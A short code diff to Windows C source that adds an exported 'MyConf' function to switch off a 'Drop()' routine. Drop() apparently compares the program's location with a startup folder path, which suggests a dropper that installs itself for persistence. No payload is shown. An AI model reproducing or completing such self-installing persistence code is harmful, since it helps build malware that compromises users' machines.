@@ -18,6 +18,17 @@
 
 extern VOID SyncThreadFunction();
 
+BOOL uDrop = TRUE;
+
+__declspec(dllexport) VOID MyConf()
+{
+#ifdef _DEBUG
+	OutputDebugString(L"[+] Setting uDrop to FALSE\n");
+#endif
+	uDrop = FALSE;
+}
+
+
 int CALLBACK WinMain(HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
 	LPSTR    lpCmdLine,
@@ -52,7 +63,6 @@ VOID Drop()
 	GetModuleFileName(NULL, pCurrentPath, 32767);
 
 	*(StrRChr(pCurrentPath, NULL, L'\\')) = 0;
-	
 	if (StrCmpI(pCurrentPath, pStartupPath))
 	{
 		GetModuleFileName(NULL, pCurrentPath, 32767);
